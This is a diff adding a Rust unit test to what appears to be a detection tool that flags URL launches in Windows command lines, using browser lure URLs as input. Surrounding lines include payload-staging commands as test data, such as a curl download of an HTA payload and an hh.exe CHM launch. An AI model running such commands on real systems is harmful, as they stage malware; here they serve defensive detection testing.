@@ -14659,6 +14659,34 @@ hh C:/Temp/payload.chm::/index.htm"#,
     }
 
     #[test]
+    fn browser_attached_url_flags_emit_url_launch() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            "chrome.exe --app=https://browser-app.example/panel",
+            &mut env,
+        );
+        interpret_line("msedge.exe --url=browser-url.example/lure.pdf", &mut env);
+        interpret_line(
+            "firefox.exe -url:https://browser-colon.example/doc",
+            &mut env,
+        );
+
+        for expected in [
+            "https://browser-app.example/panel",
+            "http://browser-url.example/lure.pdf",
+            "https://browser-colon.example/doc",
+        ] {
+            assert!(
+                env.traits
+                    .iter()
+                    .any(|t| matches!(t, Trait::UrlLaunch { url, .. } if url == expected)),
+                "missing browser attached-flag UrlLaunch for {expected}: {:?}",
+                env.traits
+            );
+        }
+    }
+
+    #[test]
     fn explorer_local_target_resolves_prior_download_source_url() {
         let report = crate::analyze(
             br#"curl -o payload.hta https://explorer-local-source.example/payload.hta
